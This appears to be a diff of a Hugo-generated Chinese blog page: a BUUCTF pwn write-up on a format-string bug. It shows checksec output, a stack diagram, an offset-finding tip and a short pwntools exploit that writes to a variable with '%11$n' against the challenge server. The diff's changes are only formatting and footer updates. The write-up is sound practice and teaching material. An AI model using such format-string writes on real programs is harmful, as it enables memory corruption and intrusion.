@@ -152,12 +152,12 @@
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">Arch:     i386-32-little
-RELRO:    Partial RELRO
-Stack:    Canary found
-NX:       NX enabled
-PIE:      No PIE (0x8048000)
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Arch:     i386-32-little
+</span></span><span class="line"><span class="cl">RELRO:    Partial RELRO
+</span></span><span class="line"><span class="cl">Stack:    Canary found
+</span></span><span class="line"><span class="cl">NX:       NX enabled
+</span></span><span class="line"><span class="cl">PIE:      No PIE (0x8048000)
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>IDA分析</p>
 <p><figure><a class="lightgallery" href="/2021-08-27-buuctf-pwn-fmtstr/image-20210828140628177.png" title="image-20210828140628177" data-thumbnail="/2021-08-27-buuctf-pwn-fmtstr/image-20210828140628177.png" data-sub-html="<h2>IDA</h2><p>image-20210828140628177</p>">
@@ -194,25 +194,25 @@ PIE:      No PIE (0x8048000)
 </span><span class="lnt">18
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">          ....
-low -----------------
-
-    -----------------
-    	 old ebp
-    -----------------stack of printf()
-         ret addr
-    ----------------       ---------
-   arg1: addr of fmt_str       |
-    -----------------          |
-                             offset
-							   |
-                               |
-addr-----------------      ---------
-  format string content
-  		........
-high-----------------
-          ....
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">          ....
+</span></span><span class="line"><span class="cl">low -----------------
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    -----------------
+</span></span><span class="line"><span class="cl">    	 old ebp
+</span></span><span class="line"><span class="cl">    -----------------stack of printf()
+</span></span><span class="line"><span class="cl">         ret addr
+</span></span><span class="line"><span class="cl">    ----------------       ---------
+</span></span><span class="line"><span class="cl">   arg1: addr of fmt_str       |
+</span></span><span class="line"><span class="cl">    -----------------          |
+</span></span><span class="line"><span class="cl">                             offset
+</span></span><span class="line"><span class="cl">							   |
+</span></span><span class="line"><span class="cl">                               |
+</span></span><span class="line"><span class="cl">addr-----------------      ---------
+</span></span><span class="line"><span class="cl">  format string content
+</span></span><span class="line"><span class="cl">  		........
+</span></span><span class="line"><span class="cl">high-----------------
+</span></span><span class="line"><span class="cl">          ....
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>最常用的方法是输入<code>aaaa</code>/<code>aaaaaaaa</code>＋<code>%p.%p.....</code>，通过看<code>0x61</code>在哪开始出现来判断偏移。</p>
 <p><img
@@ -256,26 +256,26 @@ high-----------------
 </span><span class="lnt">19
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-
-<span class="n">context</span><span class="o">.</span><span class="n">os</span> <span class="o">=</span> <span class="s2">&#34;linux&#34;</span>
-<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s2">&#34;i386&#34;</span>
-
-<span class="c1"># context.log_level = &#34;debug&#34;</span>
-
-<span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
-    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./fm&#34;</span><span class="p">)</span>
-<span class="k">else</span><span class="p">:</span>
-    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;node4.buuoj.cn&#34;</span><span class="p">,</span> <span class="mi">28965</span><span class="p">)</span>
-
-<span class="n">x_addr</span> <span class="o">=</span> <span class="mh">0x804a02c</span>
-<span class="n">format_str_offset</span> <span class="o">=</span> <span class="mi">11</span>
-
-<span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">x_addr</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;%11$n&#39;</span>
-<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-
-<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">os</span> <span class="o">=</span> <span class="s2">&#34;linux&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s2">&#34;i386&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># context.log_level = &#34;debug&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./fm&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;node4.buuoj.cn&#34;</span><span class="p">,</span> <span class="mi">28965</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">x_addr</span> <span class="o">=</span> <span class="mh">0x804a02c</span>
+</span></span><span class="line"><span class="cl"><span class="n">format_str_offset</span> <span class="o">=</span> <span class="mi">11</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">x_addr</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;%11$n&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div></div>
 
@@ -311,8 +311,8 @@ high-----------------
                 Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
             </noscript></div></article></div>
         </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.89.2">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreffer" title="DoIt 0.2.10"><i class="far fa-edit fa-fw"></i> DoIt</a>
-                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/liuliuliuzy" target="_blank" rel="noopener noreferrer">zyleo</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.93.1">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreffer" title="DoIt 0.2.10"><i class="far fa-edit fa-fw"></i> DoIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/liuliuliuzy" target="_blank" rel="noopener noreferrer">zyleo</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
         </div></footer></div>
 
     <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="回到顶部">
